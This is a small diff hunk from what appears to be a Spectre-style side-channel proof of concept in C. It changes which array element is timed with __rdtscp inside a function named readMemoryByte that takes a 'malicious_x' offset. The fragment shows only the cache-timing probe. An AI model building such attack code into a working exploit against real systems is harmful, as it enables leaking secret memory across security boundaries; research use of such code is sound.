@@ -73,7 +73,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     victim_function(); //store in big[0]
 
    
-    addr = & bigArray[1500];
+    addr = & bigArray[1];
     time1 = __rdtscp( & junk); /* READ TIMER */
     junk = * addr; /* MEMORY ACCESS TO TIME */
     time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
